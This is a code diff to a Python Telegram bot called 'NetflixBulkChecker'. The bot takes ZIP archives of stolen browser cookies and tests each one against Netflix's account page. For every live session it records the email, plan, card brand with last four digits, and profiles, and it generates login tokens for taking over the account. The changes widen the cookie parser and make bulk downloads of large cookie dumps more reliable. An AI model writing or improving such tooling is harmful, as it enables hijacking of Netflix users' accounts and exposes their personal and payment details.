@@ -42,32 +42,65 @@ class NetflixBulkChecker:
         return flags.get(code.upper(), '🌍')
 
     def parse_netscape_cookie(self, text):
-        text = text.strip()
-        if text.startswith("NetflixId="):
-            return {"NetflixId": text.split("NetflixId=", 1)[1].strip()}
+        """Universal parser - supports ALL common cookie formats"""
         cookies = {}
-        for line in text.split('\n'):
+        text = text.strip()
+        if not text:
+            return cookies
+
+        # 1. Single line full cookie string
+        if ';' in text and '=' in text:
+            for part in text.split(';'):
+                part = part.strip()
+                if '=' in part:
+                    k, v = part.split('=', 1)
+                    cookies[k.strip()] = v.strip()
+            if cookies:
+                return cookies
+
+        # 2. Line by line
+        for line in text.splitlines():
             line = line.strip()
-            if not line or line.startswith('#'): continue
-            parts = line.split('\t')
+            if not line or line.startswith('#'):
+                continue
+
+            # Netscape with tabs
+            if '\t' in line:
+                parts = line.split('\t')
+                if len(parts) >= 7:
+                    cookies[parts[5]] = parts[6]
+                    continue
+
+            # Netscape with spaces
+            parts = re.split(r'\s+', line)
             if len(parts) >= 7:
                 cookies[parts[5]] = parts[6]
+                continue
+
+            # key=value
+            if '=' in line:
+                k, v = line.split('=', 1)
+                cookies[k.strip()] = v.strip()
+
         return cookies
 
     def check_cookie(self, cookie_text, source_name):
         try:
             cookies = self.parse_netscape_cookie(cookie_text)
-            if not cookies: return None
+            if not cookies:
+                return None
 
             session = requests.Session()
             for k, v in cookies.items():
                 session.cookies.set(k, v, domain='.netflix.com', path='/')
 
-            r = session.get('https://www.netflix.com/account/membership', timeout=20, allow_redirects=True)
-            if 'login' in r.url.lower(): return None
+            r = session.get('https://www.netflix.com/account/membership', timeout=30, allow_redirects=True)
+            if 'login' in r.url.lower():
+                return None
 
             html = r.text
-            if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None
+            if '"membershipStatus":"CURRENT_MEMBER"' not in html:
+                return None
 
             result = {
                 'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) if re.search(r'"emailAddress":"([^"]+)"', html) else 'N/A',
@@ -82,7 +115,6 @@ class NetflixBulkChecker:
                 'cookie': cookie_text.strip()
             }
 
-            # Generate and save NF Token properly
             try:
                 nftoken = self.generate_nftoken(cookies)
                 if nftoken:
@@ -145,7 +177,7 @@ class NetflixBulkChecker:
                     f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
                     f.write(f"Profiles: {result['profiles']}\n")
                     f.write(f"Login URL: {result.get('login_url', 'N/A')}\n")
-                    f.write(f"NF Token: {result.get('nftoken', 'N/A')}\n")   # ← Fixed & Clean
+                    f.write(f"NF Token: {result.get('nftoken', 'N/A')}\n")
                 print(f"{Fore.GREEN}[✓] HIT #{self.stats['hits']}: {result['email']} - {result['plan']}{Style.RESET_ALL}")
             else:
                 self.stats['bad'] += 1
@@ -177,16 +209,22 @@ def handle_zip(message):
         bot.reply_to(message, "❌ Please send a .zip file")
         return
 
-    bot.reply_to(message, "✅ ZIP received. Starting check...")
+    bot.reply_to(message, "✅ ZIP received. Downloading (this may take a few seconds for large files)...")
 
     try:
         file_info = bot.get_file(message.document.file_id)
-        downloaded = bot.download_file(file_info.file_path)
+        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
 
         with tempfile.TemporaryDirectory() as tmp:
             zip_path = os.path.join(tmp, "input.zip")
-            with open(zip_path, "wb") as f:
-                f.write(downloaded)
+            
+            # === FIXED: Streaming download with high timeout ===
+            with requests.get(file_url, stream=True, timeout=120) as r:
+                r.raise_for_status()
+                with open(zip_path, 'wb') as f:
+                    for chunk in r.iter_content(chunk_size=8192):
+                        if chunk:
+                            f.write(chunk)
 
             extract_dir = os.path.join(tmp, "cookies")
             os.makedirs(extract_dir, exist_ok=True)
@@ -210,8 +248,7 @@ def handle_zip(message):
                 bot.reply_to(message, "❌ No hits found.")
 
     except Exception as e:
-        bot.reply_to(message, f"Error: {str(e)}")
-
+        bot.reply_to(message, f"❌ Error processing ZIP: {str(e)[:250]}")
 
 if __name__ == "__main__":
     print("🚀 Netflix Cookie Checker Bot Started Successfully")
